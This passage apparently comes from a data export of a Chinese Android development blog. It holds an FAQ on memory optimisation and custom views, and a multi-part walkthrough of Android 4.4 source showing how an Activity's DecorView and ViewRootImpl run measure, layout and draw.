总而言之，当我们使用inflate方法的时候，一定要记得加入root参数，这样我们解析的布局文件大小才能正确无误，要是希望布局文件解析完后添加到root中，只需把attachToRoot设为true即可。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"Android常见问题总结（五）","slug":"Android常见问题总结（五）","date":"2016-05-17T04:36:13.000Z","updated":"2020-05-11T07:23:44.580Z","comments":true,"path":"2016/05/17/Android常见问题总结（五）/","link":"","permalink":"https://superxlcr.github.io/2016/05/17/Android常见问题总结（五）/","excerpt":"","text":"上一篇文章的传送门：Android常见问题总结（四） Android内存优化方法首先有一些与内存泄漏相关的点：Android防止内存泄露小结，在此不再赘述了。 还有一些内存优化的方法，个人认为有以下几个方面： Java引用的灵活使用 图片缓存 Bitmap压缩加载 Java引用的灵活使用众所周知，在Java中有强软弱虚四种引用，合理的使用软引用和弱引用有利于GC工作的进行，回收不需要的内存。 图片缓存使用图片缓存可以有效防止内存中同时载入过多的图片，也可以减少经常载入图片所耗费的时间。一般而言，设计图片缓存的思路如下，可以把图片的缓存分为以下几个层级： 强引用 HashMap （用于存储最常用的图片） 软引用 HashMap （用于存储比较常用的图片） SD卡 （用于存储使用过的图片） 下载 （第一次使用） 一般而言我们都是用LRU算法（最近最少使用），最近使用的图片一般缓存于强引用的HashMap中，随着使用次数的减少慢慢移动至软引用HashMap、SD卡中。除了我们自己设计图片缓存外，我们还可以直接使用Google提供的LruCache（内部由LinkedHashMap实现缓存队列），以及DiskLruCache（用于实现硬盘缓存的，需要自行下载，代码地址）。 Bitmap压缩加载对于某些原尺寸特别大的图片，我们可以选择压缩后再加载以节省我们的内存空间： 12345678910111213// 创建解析参数Options options = new Options();// 只解析大小，并不生成实际图片options.inJustDecodeBounds = true;BitmapFactory.decodeFile(pathName, options);// 计算缩放大小int widthScale = options.outWidth/width_we_need;int heightScale = options.outHeight/height_we_need;// 选取小的为缩放尺寸options.inSampleSize = Math.min(widthScale, heightScale);// 生成Bitmapoptions.inJustDecodeBounds = false; // 记得关掉Bitmap bitmap = BitmapFactory.decodeFile(pathName, options); 压缩到合适的尺寸后再加载就不必担心原来的bitmap太大而占用内存空间了。 Android中弱引用与软引用的应用场景软引用与弱引用一般用于：需要某个对象，但又不关心它的死活的时候（就是该对象存在就用，不存在就算了）。在Android中的应用场景主要有： Handler获取Activity的引用：使用静态变量和软弱引用保证不干扰Activity的回收 缓存设计：使用软弱应用保证内存紧张时GC可以回收使用较少的缓存资源 View与View Group分类，自定义View过程View是Android中基本的UI单元，占据屏幕的一块矩形区域，可用于绘制并能处理事件，而ViewGroup是View的子类，他能包含多个View，并让他们在其中按照一定的规则排列。View与ViewGroup的设计使用了组合模式。 自定义View我们一般需要重写一下三个方法： onMeasure：用于测量自定义View的大小，在方法中必须调用setMeasureDimension方法 onLayout：用于确定自定义View布局 onDraw：用于绘制自定义View本身 对于measure、layout、draw的更详细流程可参考我的另一篇博客：一个Activity的显示过程总结（四） Touch事件分发机制可参考：Android View 与 ViewGroup 事件分发总结","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"一个Activity的显示过程总结（四）","slug":"一个Activity的显示过程总结（四）","date":"2016-05-17T04:29:01.000Z","updated":"2020-05-11T07:23:44.788Z","comments":true,"path":"2016/05/17/一个Activity的显示过程总结（四）/","link":"","permalink":"https://superxlcr.github.io/2016/05/17/一个Activity的显示过程总结（四）/","excerpt":"","text":"有兴趣自己看Android源码的同学可以前往：http://grepcode.com/project/repository.grepcode.com/java/ext/com.google.android/android/本博客分析的Android版本为4.4 上一篇博客传送门：一个Activity的显示过程总结（三） 上一篇博客我们讲到了ViewRoot中与UI相关的三个重要步骤：performMeasure（测量）、performLayout（布局）和performDraw（绘制），这次我们就来重点研究一下这三个方法。先上图说明三个方法的关系： measure流程在performTraversals中有多次measure的流程，我们只分析其中一次即可：（android.view.ViewRootImpl） 123456789101112131415final WindowManager.LayoutParams mWindowAttributes = new WindowManager.LayoutParams(); private void performTraversals() &#123; ... WindowManager.LayoutParams lp = mWindowAttributes; ... int childWidthMeasureSpec = getRootMeasureSpec(mWidth, lp.width); int childHeightMeasureSpec = getRootMeasureSpec(mHeight, lp.height); ... // Ask host how big it wants to be performMeasure(childWidthMeasureSpec, childHeightMeasureSpec); ... &#125; 首先我们构造了一个WindowManager.LayoutParams对象：mWindowAttributes，其中包含了有关于Window（最外层布局）的信息。在performTraversals中，我们把它赋值给了lp，并通过getRootMeasureSpec方法返回了两个关键的测量量。我们一起来看看getRootMeasureSpec方法：（android.view.ViewRootImpl） 1234567891011121314151617181920212223242526272829303132/** * Figures out the measure spec for the root view in a window based on it's * layout params. * * @param windowSize * The available width or height of the window * * @param rootDimension * The layout params for one dimension (width or height) of the * window. * * @return The measure spec to use to measure the root view. */ private static int getRootMeasureSpec(int windowSize, int rootDimension) &#123; int measureSpec; switch (rootDimension) &#123; case ViewGroup.LayoutParams.MATCH_PARENT: // Window can't resize. Force root view to be windowSize. measureSpec = MeasureSpec.makeMeasureSpec(windowSize, MeasureSpec.EXACTLY); break; case ViewGroup.LayoutParams.WRAP_CONTENT: // Window can resize. Set max size for root view. measureSpec = MeasureSpec.makeMeasureSpec(windowSize, MeasureSpec.AT_MOST); break; default: // Window wants to be an exact size. Force root view to be that size. measureSpec = MeasureSpec.makeMeasureSpec(rootDimension, MeasureSpec.EXACTLY); break; &#125; return measureSpec; &#125; 由该方法的注释我们可以得知这个方法是用来确定rootView（即DecorView）的measure spec（一个测量量）的。该方法传入两个参数，第一个是window的实际大小，第二个是window的尺寸（一般而言是MATCH_PARENT，即占满整个屏幕）。首先我们一起来看看MeasureSpec是什么东西：（android.view.View） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * A MeasureSpec encapsulates the layout requirements passed from parent to child. * Each MeasureSpec represents a requirement for either the width or the height. * A MeasureSpec is comprised of a size and a mode. There are three possible * modes: * UNSPECIFIED * The parent has not imposed any constraint on the child. It can be whatever size * it wants. * EXACTLY * The parent has determined an exact size for the child. The child is going to be * given those bounds regardless of how big it wants to be. * AT_MOST * The child can be as large as it wants up to the specified size. * * MeasureSpecs are implemented as ints to reduce object allocation. This class * is provided to pack and unpack thesize, mode tuple into the int. */ public static class MeasureSpec &#123; private static final int MODE_SHIFT = 30; private static final int MODE_MASK = 0x3 &lt;&lt; MODE_SHIFT; /** * Measure specification mode: The parent has not imposed any constraint * on the child. It can be whatever size it wants. */ public static final int UNSPECIFIED = 0 &lt;&lt; MODE_SHIFT; /** * Measure specification mode: The parent has determined an exact size * for the child. The child is going to be given those bounds regardless * of how big it wants to be. */ public static final int EXACTLY = 1 &lt;&lt; MODE_SHIFT; /** * Measure specification mode: The child can be as large as it wants up * to the specified size. */ public static final int AT_MOST = 2 &lt;&lt; MODE_SHIFT; public static int makeMeasureSpec(int size, int mode) &#123; if (sUseBrokenMakeMeasureSpec) &#123; return size + mode; &#125; else &#123; return (size &amp; ~MODE_MASK) | (mode &amp; MODE_MASK); &#125; &#125; ... &#125; MeasureSpec是View内部的一个静态类。根据其注释我们可以得知：MeasureSpec用于描述通过父类到子类的布局要求（子类布局与父类相关），每个MeasureSpec表示宽度或高度的要求，一个MeasureSpec由一个大小（size）和模式（mode）组成（其实就是一个int，32位，根据计算方法可知前2位表示mode，后30位表示size）。定义的模式有三种： UNSPECIFIED：父类对子类没有任何约束 EXACTLY：父View已经测量出子Viwe所需要的精确大小，这时候View的最终大小就是SpecSize所指定的值。对应于match_parent和精确数值这两种模式 AT_MOST：子View的最终大小是父View指定的SpecSize值，并且子View的大小不能大于这个值，即对应wrap_content这种模式 makeMeasure方法的作用就是通过计算组合出一个合理的MeasureSpec。 回到getRootMeasureSpec，由于我们的Window默认是MATCH_PARENT，充满屏幕大小的，因此getRootMeasureSpec返回的MeasureSpec为：size是屏幕的宽、高，mode是EXACTLY。在获取了Window的MeasureSpec后，我们在performTraversals方法中调用了performMeasure方法，并把Window的MeasureSpec作为参数传入：（android.view.ViewRootImpl） 12345678private void performMeasure(int childWidthMeasureSpec, int childHeightMeasureSpec) &#123; Trace.traceBegin(Trace.TRACE_TAG_VIEW, \"measure\"); try &#123; mView.measure(childWidthMeasureSpec, childHeightMeasureSpec); &#125; finally &#123; Trace.traceEnd(Trace.TRACE_TAG_VIEW); &#125; &#125; 该方法调用了mView（即DecorView）的measure，由于View中的measure是个final方法，因此DecorView调用的方法即是View的measure方法：（android.view.View） 123456789101112131415161718192021222324252627282930int mPrivateFlags; public final void measure(int widthMeasureSpec, int heightMeasureSpec) &#123; ... // 大致是强制需要测量的意思 if ((mPrivateFlags &amp; PFLAG_FORCE_LAYOUT) == PFLAG_FORCE_LAYOUT || widthMeasureSpec != mOldWidthMeasureSpec || heightMeasureSpec != mOldHeightMeasureSpec) &#123; // first clears the measured dimension flag mPrivateFlags &amp;= ~PFLAG_MEASURED_DIMENSION_SET; resolveRtlPropertiesIfNeeded(); // measure ourselves, this should set the measured dimension flag back onMeasure(widthMeasureSpec, heightMeasureSpec); // flag not set, setMeasuredDimension() was not invoked, we raise // an exception to warn the developer if ((mPrivateFlags &amp; PFLAG_MEASURED_DIMENSION_SET) != PFLAG_MEASURED_DIMENSION_SET) &#123; throw new IllegalStateException(\"onMeasure() did not set the\" + \" measured dimension by calling\" + \" setMeasuredDimension()\"); &#125; mPrivateFlags |= PFLAG_LAYOUT_REQUIRED; &#125; mOldWidthMeasureSpec = widthMeasureSpec; mOldHeightMeasureSpec = heightMeasureSpec; &#125; 首先在View中出现了一个很重要的变量：mPrivateFlags，这是一个int类型的变量，它的每一个bit用于表示一种状态。这个变量在研究layout与draw方法时我们也能见到。在measure中，如果当前的状态为需要强制测量，而传入的MeasureSpec又不等于旧值时，就会调用onMeasure方法。onMeasure方法是我们自定义View时候可以重写的方法（不能重写final方法measure），在重写onMeasure方法时有一点需要注意：我们需要在onMeasure方法中调用setMeasuredDimension方法设置宽与高，否则在第20行就会抛出IllegalStateException异常。View提供的默认onMeasure实现就调用了setMeasuredDimension方法：（android.view.View） 1234protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(getDefaultSize(getSuggestedMinimumWidth(), widthMeasureSpec), getDefaultSize(getSuggestedMinimumHeight(), heightMeasureSpec)); &#125; 总而言之，经过了measure流程，View的宽与高的大小就确定了 layout流程measure流程确定了View的大小，接下来的layout流程就要确定View的位置了，在performTraversals中我们调用了performLayout方法：（android.view.ViewRootImpl） 12345private void performTraversals() &#123; ... performLayout(lp, desiredWindowWidth, desiredWindowHeight); ... &#125; （android.view.ViewRootImpl） 1234567891011private void performLayout(WindowManager.LayoutParams lp, int desiredWindowWidth, int desiredWindowHeight) &#123; ... final View host = mView; ... try &#123; host.layout(0, 0, host.getMeasuredWidth(), host.getMeasuredHeight()); ... &#125; 在performLayout中，我们调用了host（即DecorView）的layout方法，由于ViewGroup类重写了layout，我们来看看ViewGroup的layout方法：（android.view.ViewGroup） 123456789101112@Override public final void layout(int l, int t, int r, int b) &#123; if (!mSuppressLayout &amp;&amp; (mTransition == null || !mTransition.isChangingLayout())) &#123; if (mTransition != null) &#123; mTransition.layoutChange(this); &#125; super.layout(l, t, r, b); &#125; else &#123; // record the fact that we noop'd it; request layout when transition finishes mLayoutCalledWhileSuppressed = true; &#125; &#125; 貌似挖掘不了什么有用的信息，我们继续看看super调用的View的layout方法：（android.view.View） 123456789101112131415public void layout(int l, int t, int r, int b) &#123; int oldL = mLeft; int oldT = mTop; int oldB = mBottom; int oldR = mRight; boolean changed = isLayoutModeOptical(mParent) ? setOpticalFrame(l, t, r, b) : setFrame(l, t, r, b); if (changed || (mPrivateFlags &amp; PFLAG_LAYOUT_REQUIRED) == PFLAG_LAYOUT_REQUIRED) &#123; onLayout(changed, l, t, r, b); mPrivateFlags &amp;= ~PFLAG_LAYOUT_REQUIRED; ... &#125; mPrivateFlags &amp;= ~PFLAG_FORCE_LAYOUT; &#125; 该方法首先调用setFrame方法查看View的大小布局与上次相比是否发生变化，如果发生变化或mPrivateFlags的状态为需要进行layout，则调用onLayout进行布局。我们先来看看setFrame方法（setOpticalFrame内部也是通过setFrame方法完成）：（android.view.View） 12345678910111213141516171819202122232425262728293031323334protected boolean setFrame(int left, int top, int right, int bottom) &#123; boolean changed = false; ... if (mLeft != left || mRight != right || mTop != top || mBottom != bottom) &#123; changed = true; // Remember our drawn bit int drawn = mPrivateFlags &amp; PFLAG_DRAWN; int oldWidth = mRight - mLeft; int oldHeight = mBottom - mTop; int newWidth = right - left; int newHeight = bottom - top; boolean sizeChanged = (newWidth != oldWidth) || (newHeight != oldHeight); ... if (sizeChanged) &#123; if ((mPrivateFlags &amp; PFLAG_PIVOT_EXPLICITLY_SET) == 0) &#123; // A change in dimension means an auto-centered pivot point changes, too if (mTransformationInfo != null) &#123; mTransformationInfo.mMatrixDirty = true; &#125; &#125; sizeChange(newWidth, newHeight, oldWidth, oldHeight); &#125; ... &#125; return changed; &#125; setFrame通过比较left、right、top、bottom四个变量确定View的布局是否发生变化，并返回该布尔值。另外，如果setFrame通过计算发现View的大小也发生了变化，则会调用sizeChange方法：（android.view.View） 1234567private void sizeChange(int newWidth, int newHeight, int oldWidth, int oldHeight) &#123; onSizeChanged(newWidth, newHeight, oldWidth, oldHeight); if (mOverlay != null) &#123; mOverlay.getOverlayView().setRight(newWidth); mOverlay.getOverlayView().setBottom(newHeight); &#125; &#125; sizeChange会调用onSizeChanged，我们可以重写该方法执行一些View大小变化时的操作。 回到layout方法，setFrame的返回值会被存在changed变量中，当changed为true时，即当View的布局发生了变化时，layout方法会调用onLayout方法。onLayout一般由View的子类进行重写以执行一些布局操作，ViewGroup把onLayout重写为抽象方法，使得每一个ViewGroup布局都需要重写onLayout实现自己的特定布局效果：（android.view.ViewGroup） 123@Override protected abstract void onLayout(boolean changed, int l, int t, int r, int b); draw流程layout流程完成后，我们获得了View的大小和布局，剩下的工作就是把View绘制到我们的屏幕上了。在performTraversals中，我们调用了performLayout获取布局后，调用了performDraw来绘制我们需要的图像：（android.view.ViewRootImpl） 1234567891011121314151617private void performDraw() &#123; ... final boolean fullRedrawNeeded = mFullRedrawNeeded; mFullRedrawNeeded = false; mIsDrawing = true; Trace.traceBegin(Trace.TRACE_TAG_VIEW, \"draw\"); try &#123; draw(fullRedrawNeeded); &#125; finally &#123; mIsDrawing = false; Trace.traceEnd(Trace.TRACE_TAG_VIEW); &#125; ... &#125; 在performDraw方法中，我们调用了draw方法进行绘制，并传入了一个布尔值表示是否整个屏幕都需要重新绘制：（android.view.ViewRootImpl） 123456789101112131415161718192021222324252627282930313233private void draw(boolean fullRedrawNeeded) &#123; Surface surface = mSurface; ... final Rect dirty = mDirty; ... if (fullRedrawNeeded) &#123; attachInfo.mIgnoreDirtyState = true; dirty.set(0, 0, (int) (mWidth * appScale + 0.5f), (int) (mHeight * appScale + 0.5f)); &#125; ... // 使用硬件渲染绘制 if (!dirty.isEmpty() || mIsAnimating) &#123; if (attachInfo.mHardwareRenderer != null &amp;&amp; attachInfo.mHardwareRenderer.isEnabled()) &#123; ... attachInfo.mHardwareRenderer.draw(mView, attachInfo, this, animating ? null : mCurrentDirty); &#125; else &#123; ... // 使用软件渲染绘制 if (!drawSoftware(surface, attachInfo, yoff, scalingRequired, dirty)) &#123; return; &#125; &#125; &#125; ... &#125; 在draw方法中，我们首先根据传入的布尔值计算出一个dirty的矩形区域（脏区域，表示要绘制的区域），然后使用硬件或软件的方法进行渲染绘制，由于博主对硬件渲染不熟悉，这里我们分析软件方式渲染绘制的drawSoftware方法：（android.view.ViewRootImpl） 1234567891011121314151617181920212223242526272829303132/** * @return true if drawing was succesfull, false if an error occurred */ private boolean drawSoftware(Surface surface, AttachInfo attachInfo, int yoff, boolean scalingRequired, Rect dirty) &#123; // Draw with software renderer. Canvas canvas; try &#123; int left = dirty.left; int top = dirty.top; int right = dirty.right; int bottom = dirty.bottom; canvas = mSurface.lockCanvas(dirty); ... try &#123; ... mView.draw(canvas); ... &#125; finally &#123; try &#123; surface.unlockCanvasAndPost(canvas); &#125; ... &#125; return true; &#125; 在drawSoftware方法中，第15行首先调用mSurface（Surface对象，管理一块用于绘制的缓存区）的lockCanvas方法，通过传入dirty变量（脏区域）锁定获取了一块画布（Canvas对象），然后调用了mView（即DecorView）的draw方法在canvas上进行绘制，最后再使用mSurface的unlockCanvasAndPost方法解锁提交画布，交给底层进行渲染。虽然View的子类重写了draw方法，但他们都调用了super.draw，因此我们接下来一起看看最关键的View的draw方法：（android.view.View） 12345678910111213141516171819202122232425262728293031323334353637383940414243public void draw(Canvas canvas) &#123; ... /* * Draw traversal performs several drawing steps which must be executed * in the appropriate order: * * 1. Draw the background * 2. If necessary, save the canvas' layers to prepare for fading * 3. Draw view's content * 4. Draw children * 5. If necessary, draw the fading edges and restore layers * 6. Draw decorations (scrollbars for instance) */ // Step 1, draw the background, if needed int saveCount; if (!dirtyOpaque) &#123; ... background.draw(canvas); ... &#125; // Step 2, save the canvas' layers ... // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); // Step 5, draw the fade effect and restore layers ... // Step 6, draw decorations (scrollbars) onDrawScrollBars(canvas); if (mOverlay != null &amp;&amp; !mOverlay.isEmpty()) &#123; mOverlay.getOverlayView().dispatchDraw(canvas); &#125; &#125; draw的注释解释的非常清晰，其过程主要分为6个步骤： 绘制背景：调用background.draw绘制背景 保存布局为渐变准备 绘制View本身：调用onDraw 绘制子View：调用dispatchDraw 绘制渐变效果并回复布局 绘制装饰品（如滚动条等） 当我们需要为自定义的View绘制时，只需重写onDraw方法即可。 以上即是一个Activity的显示过程的简略总结，其中还有许多细节没有研究，希望以后有时间可以去进一步深入探索。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"一个Activity的显示过程总结（三）","slug":"一个Activity的显示过程总结（三）","date":"2016-05-15T03:14:28.000Z","updated":"2020-05-11T07:23:44.785Z","comments":true,"path":"2016/05/15/一个Activity的显示过程总结（三）/","link":"","permalink":"https://superxlcr.github.io/2016/05/15/一个Activity的显示过程总结（三）/","excerpt":"","text":"有兴趣自己看Android源码的同学可以前往：http://grepcode.com/project/repository.grepcode.com/java/ext/com.google.android/android/本博客分析的Android版本为4.4 上一篇博客传送门：一个Activity的显示过程总结（二） 上次我们追踪源码，分析到了ViewRoot这个关键的对象，接下来我们就从ViewRoot说起吧（ViewRoot貌似是android 2.x时候的说法了，现在变成了ViewRootImpl）： ViewRoot首先我们先来说明一下，ViewRoot是什么？官方的注释如下： 1The top of a view hierarchy, implementing the needed protocol between View and the WindowManager. 翻译为：View层次的顶端，实现View和WindowManager之间所需的协议。ViewRoot是由View组成的视图树状结构的“根”，但它并不处理绘画，而是处理有关于整个树状结构的事情（如遍历初始化、点击分发等）。 先来看看ViewRoot中的关键对象和构造函数：（android.view.ViewRootImpl） 1234567891011121314final IWindowSession mWindowSession; final W mWindow; View mView; // These can be accessed by any thread, must be protected with a lock. // Surface can never be reassigned or cleared (use Surface.clear()). private final Surface mSurface = new Surface(); public ViewRootImpl(Context context, Display display) &#123; mContext = context; mWindowSession = WindowManagerGlobal.getWindowSession(); ... mWindow = new W(this); ... &#125; 关键对象有这几个： mWindowSession：IWindowSession类型对象，用于Binder通信，在ViewRoot中表示WindowManagerService，用以调用WindowManagerService的服务 mWindow：W类型对象（实际为IWindow.Stub类型），同样用于Binder通信，用以由WindowManagerService发送消息给ViewRoot mView：保存我们的DecorView mSurface：Surface对象，官方的注释为：Handle onto a raw buffer that is being managed by the screen compositor。即它的职责是管理一块用于绘制的缓存区，因此Surface也就是我们绘制时的画布 用一幅图大致说明ViewRoot的关键对象： 由于IWindowSession、IWindow以及Surface涉及JNI以及Native层的代码，这里就不继续深入分析了。 ViewRootImpl#setView接下来我们来看看ViewRoot的setView方法：（android.view.ViewRootImpl） 1234567891011121314public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) &#123; synchronized (this) &#123; if (mView == null) &#123; mView = view; ... // Schedule the first layout -before- adding to the window // manager, to make sure we do the relayout before receiving // any other events from the system. requestLayout(); ... &#125; &#125; &#125; setView方法首先把我们传入的DecorView赋给了mView，然后调用了requestLayout方法：（android.view.ViewRootImpl） 1234567public void requestLayout() &#123; if (!mHandlingLayoutInLayoutRequest) &#123; checkThread(); mLayoutRequested = true; scheduleTraversals(); &#125; &#125; 又调用了scheduleTraversals方法：（android.view.ViewRootImpl） 123456789void scheduleTraversals() &#123; if (!mTraversalScheduled) &#123; mTraversalScheduled = true; mTraversalBarrier = mHandler.getLooper().postSyncBarrier(); mChoreographer.postCallback( Choreographer.CALLBACK_TRAVERSAL, mTraversalRunnable, null); scheduleConsumeBatchedInput(); &#125; &#125; 在该方法的第6行，传入了一个关键的Runnable对象mTraversalRunnable作为回调，我们来看看它的run方法：（android.view.ViewRootImpl） 1234567final class TraversalRunnable implements Runnable &#123; @Override public void run() &#123; doTraversal(); &#125; &#125; final TraversalRunnable mTraversalRunnable = new TraversalRunnable(); 调用了doTraversal方法：（android.view.ViewRootImpl） 12345678void doTraversal() &#123; if (mTraversalScheduled) &#123; ... try &#123; performTraversals(); ... &#125; &#125; doTraversal调用了关键的performTraversals方法：（android.view.ViewRootImpl） 12345678910111213141516private void performTraversals() &#123; // cache mView since it is used so much below... final View host = mView; // DecorView ... // Ask host how big it wants to be performMeasure(childWidthMeasureSpec, childHeightMeasureSpec); ... performLayout(lp, desiredWindowWidth, desiredWindowHeight); ... performDraw(); ... &#125; 原代码非常长，我挑出了3个最主要的方法： performMeasure：与测量View的大小相关 performLayout：与View的布局有关 performDraw：与View的绘制相关 这三个方法与我们涉及View绘制过程时耳熟能详的三部曲Measure、Layout、Draw相关，由于这几个函数间的关系还是比较复杂的，因此我们就留到下一篇博客再分析它们了。最后还是以我们的分析路线结束本篇博客：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"一个Activity的显示过程总结（二）","slug":"一个Activity的显示过程总结（二）","date":"2016-05-13T08:28:29.000Z","updated":"2020-05-11T07:23:44.786Z","comments":true,"path":"2016/05/13/一个Activity的显示过程总结（二）/","link":"","permalink":"https://superxlcr.github.io/2016/05/13/一个Activity的显示过程总结（二）/","excerpt":"","text":"有兴趣自己看Android源码的同学可以前往：http://grepcode.com/project/repository.grepcode.com/java/ext/com.google.android/android/本博客分析的Android版本为4.4 上一篇博客传送门：一个Activity的显示过程总结（一） 上次我们追踪源码分析到了android.app.Activity的attach方法中，接下来我们来看看下一个关键的callActivityOnCreate方法： callActivityOnCreate（android.app.Instrumentation） 1234567public void callActivityOnCreate(Activity activity, Bundle icicle) &#123; ... activity.performCreate(icicle); ... &#125; 调用了Activity的performCreate方法：（android.app.Activity） 123456final void performCreate(Bundle icicle) &#123; onCreate(icicle); mVisibleFromClient = !mWindow.getWindowStyle().getBoolean( com.android.internal.R.styleable.Window_windowNoDisplay, false); mFragments.dispatchActivityCreated(); &#125; 调用了我们熟悉的Activity生命周期里的onCreate，在onCreate我们最熟悉的对界面初始化的函数绝对非setContentView莫属了，接下来我们一起看一下setContentView：（android.app.Activity） 1234public void setContentView(int layoutResID) &#123; getWindow().setContentView(layoutResID); initActionBar(); &#125; getWindow方法返回了什么？（android.app.Activity） 123public Window getWindow() &#123; return mWindow; &#125; 原来setContentView方法把工作委托给了mWindow的setContentView方法，从上一篇博客我们得知mWindow的实际类型是PhoneWindow，下面来看看PhoneWindow的setContentView方法：（com.android.internal.policy.impl.PhoneWindow） 123456789101112public void setContentView(int layoutResID) &#123; if (mContentParent == null) &#123; installDecor(); &#125; else &#123; mContentParent.removeAllViews(); &#125; mLayoutInflater.inflate(layoutResID, mContentParent); final Callback cb = getCallback(); if (cb != null &amp;&amp; !isDestroyed()) &#123; cb.onContentChanged(); &#125; &#125; 在这个方法里有两个关键点： 第3行的installDecor：第一次调用setContentView时初始化顶层的DecorView 第7行的inflate：把我们传入setContentView inflate并置入mContentParent中 先来分析installDecor installDecor首先我们先来了解一下什么是DecorView：DecorView是PhoneWindow的一个内部类，继承自FrameLayout：（com.android.internal.policy.impl.PhoneWindow） 1private final class DecorView extends FrameLayout implements RootViewSurfaceTaker &#123; DecorView是一个非常重要的ViewGroup容器，因为它是我们Activity的第一个View，是Activity最顶层的ViewGroup。DecorView的设计使用了装饰器模式，我们setContentView设置的View其实只是DecorView的子View，DecorView通过包装在我们设置的View的外部，为我们的Activity提供了ActionBar、标题栏等控件。也即我们的Activity的UI层级可以这样表示： 接下来一起来看看installDecor方法：（com.android.internal.policy.impl.PhoneWindow） 12345678910111213141516171819private void installDecor() &#123; if (mDecor == null) &#123; mDecor = generateDecor(); ... &#125; if (mContentParent == null) &#123; mContentParent = generateLayout(mDecor); // Set up decor part of UI to ignore fitsSystemWindows if appropriate. mDecor.makeOptionalFitsSystemWindows(); mTitleView = (TextView)findViewById(com.android.internal.R.id.title); // 设置Title和ActionBar，涉及许多Feature参数，因此对Activity的requestWindowFeature方法应该在setContentView前完成 ... &#125; &#125; protected DecorView generateDecor() &#123; return new DecorView(getContext(), -1); &#125; 首先我们看到第3行的generateDecor方法，这个方法创建了一个DecorView对象并赋给了mDecor。然后我们再看到第7行，这里有一个关键的generateLayout方法，设置了非常关键的mContentParent变量：（com.android.internal.policy.impl.PhoneWindow） 1234567891011121314public static final int ID_ANDROID_CONTENT = com.android.internal.R.id.content; protected ViewGroup generateLayout(DecorView decor) &#123; // WindowFeature相关设置 ... View in = mLayoutInflater.inflate(layoutResource, null); decor.addView(in, new ViewGroup.LayoutParams(MATCH_PARENT, MATCH_PARENT)); ViewGroup contentParent = (ViewGroup)findViewById(ID_ANDROID_CONTENT); // 背景相关设置 ... return contentParent; &#125; 在该方法的第9行，使用了findViewById方法返回了我们需要的contentParent，id为第一行所示的android.R.id.content，该方法定义在Window基类中：（android.view.Window） 123public View findViewById(int id) &#123; return getDecorView().findViewById(id); &#125; 其实就是返回DecorView中的id为android.R.id.content的ViewGroup（其实是一个FrameLayout） inflate接下来让我们回到setContentView中第7行的inflate方法，调用该方法时我们传入了我们设置layout的id和id为android.R.id.content的FrameLayout。由于inflate是个比较常见的方法，这里就不深入分析了，该方法执行的结果是：我们inflate了我们设置的layout，并把它加入了id为android.R.id.content的FrameLayout中，此时Activity的UI变为： 万万没想到原来Activity的界面是如此复杂的啊~有兴趣的朋友还可以使用SDK的tools目录下的hierarchyviewer工具打开一个Activity来查看一下是不是这样。 到这里Activity的onCreate方法的分析就结束了，先让我们看一看我们的分析路线： handleResumeActivity看来是时候回到ActivityThread类中，解决遗留下来的handleResumeActivity方法了：（android.app.ActivityThread） 1234567891011121314151617181920212223242526final void handleResumeActivity(IBinder token, boolean clearHide, boolean isForward, boolean reallyResume) &#123; ... // 与调用Activity的onResume相关 ActivityClientRecord r = performResumeActivity(token, clearHide); ... // PhoneWindow r.window = r.activity.getWindow(); // 获取Activity的DecorView View decor = r.window.getDecorView(); decor.setVisibility(View.INVISIBLE); // WindowManagerImpl ViewManager wm = a.getWindowManager(); WindowManager.LayoutParams l = r.window.getAttributes(); a.mDecor = decor; l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION; l.softInputMode |= forwardBit; if (a.mVisibleFromClient) &#123; a.mWindowAdded = true; wm.addView(decor, l); &#125; ... &#125; 第6行的方法调用与Activity的onResume生命周期有关，但这次我们的重点不在这里，我们一起来看看第22行的wm（即WindowManagerImpl）的addView方法：（android.view.WindowManagerImpl） 12345private final WindowManagerGlobal mGlobal = WindowManagerGlobal.getInstance(); public void addView(View view, ViewGroup.LayoutParams params) &#123; mGlobal.addView(view, params, mDisplay, mParentWindow); &#125; 工作被委托给了WindowManagerGlobal（由创建方式可以猜测其使用了单件设计模式），我们一起进入WindowManagerGlobal看看：（android.view.WindowManagerGlobal） 1234567891011121314151617181920212223242526272829public void addView(View view, ViewGroup.LayoutParams params, Display display, Window parentWindow) &#123; ... ViewRootImpl root; View panelParentView = null; synchronized (mLock) &#123; ... root = new ViewRootImpl(view.getContext(), display); ... &#125; // do this last because it fires off messages to start doing things try &#123; root.setView(view, wparams, panelParentView); &#125; catch (RuntimeException e) &#123; // BadTokenException or InvalidDisplayException, clean up. synchronized (mLock) &#123; final int index = findViewLocked(view, false); if (index &gt;= 0) &#123; removeViewLocked(index, true); &#125; &#125; throw e; &#125; &#125; 到这里，我们UI绘制的主角终于登场了——ViewRoot这个方法里有两个关键点： 第11行ViewRoot的创建 第18行的setView方法 